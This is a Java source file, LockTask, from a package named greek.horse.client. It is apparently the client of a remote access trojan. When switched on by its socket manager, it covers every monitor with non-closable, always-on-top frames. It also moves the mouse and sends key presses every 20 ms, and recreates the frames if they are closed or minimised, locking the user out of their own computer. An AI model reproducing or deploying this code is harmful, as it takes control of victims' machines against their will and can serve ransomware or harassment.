package greek.horse.client;

import javax.swing.*;
import java.awt.*;
import java.awt.event.KeyEvent;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicBoolean;

public class LockTask implements Runnable {
    private final ClientSocketManager father;
    private final CopyOnWriteArrayList<JFrame> framesList = new CopyOnWriteArrayList<>();
    private final Robot bot;
    private final AtomicBoolean selfRunning = new AtomicBoolean(false);

    public LockTask(ClientSocketManager father, Robot bot) {
        this.father = father;
        this.bot = bot;
        createFrames();
    }

    private void createFrames() {
        removeListeners();
        framesList.forEach(frame -> {
            frame.setVisible(false);
        });
        framesList.clear();
        for (GraphicsDevice device : GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()) {
            Rectangle bounds = device.getDefaultConfiguration().getBounds();
            JFrame frame = new JFrame("LOCK");
            frame.setAlwaysOnTop(true);
            frame.setUndecorated(true);
            frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            frame.setSize(bounds.getSize());
            frame.setLocation(bounds.getLocation());
            frame.setVisible(false);
            framesList.add(frame);
        }
    }

    @Override
    public void run() {
        while (father.getRunning().get()) {
            if (selfRunning.get()) {
                bot.mouseMove(0, 0);
                bot.keyPress(KeyEvent.VK_UP);
                bot.keyRelease(KeyEvent.VK_UP);
                bot.keyPress(KeyEvent.VK_LEFT);
                bot.keyRelease(KeyEvent.VK_LEFT);
                framesList.forEach(JFrame::toFront);
                framesList.forEach(frame -> {
                    frame.setVisible(true);
                });
            }
            try {
                Thread.sleep(selfRunning.get() ? 20 : 200);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public void setRunning(boolean lock) {
        if (lock != this.selfRunning.get()) {
            if (lock) {
                framesList.forEach(frame -> {
                    frame.addWindowListener(new WindowListener() {
                        @Override
                        public void windowOpened(WindowEvent e) {

                        }

                        @Override
                        public void windowClosing(WindowEvent e) {
                        }

                        @Override
                        public void windowClosed(WindowEvent e) {
                            createFrames();
                        }

                        @Override
                        public void windowIconified(WindowEvent e) {
                            createFrames();
                        }

                        @Override
                        public void windowDeiconified(WindowEvent e) {

                        }

                        @Override
                        public void windowActivated(WindowEvent e) {

                        }

                        @Override
                        public void windowDeactivated(WindowEvent e) {
                        }
                    });
                });
            } else {
                removeListeners();
            }
            this.selfRunning.set(lock);
            framesList.forEach(frame -> {
                frame.setVisible(lock);
            });
        }
    }

    private void removeListeners() {
        framesList.forEach(frame -> {
            for (WindowListener wl : frame.getWindowListeners()) {
                frame.removeWindowListener(wl);
            }
        });
    }
}
